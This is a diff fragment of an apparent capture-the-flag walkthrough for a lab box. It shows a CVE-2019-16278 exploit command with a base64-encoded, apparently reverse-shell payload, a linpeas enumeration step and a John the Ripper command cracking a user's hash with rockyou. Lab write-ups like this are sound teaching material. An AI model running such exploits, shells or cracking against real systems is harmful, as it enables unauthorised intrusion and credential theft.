@@ -61,7 +61,12 @@ python2.7 cve2019_16278.py 10.10.10.165 80 "echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2t
 
 
 We're on the box
+Using linpeas.sh to enumerate I find david's hash, craking time 2!
 
 
+```
+~/src/john/run/./john hash -w=/usr/share/SecLists/Passwords/rockyou.txt
+(I'm using linux mint, adjust to your needs for kali, parrot etc)
+```
 
 
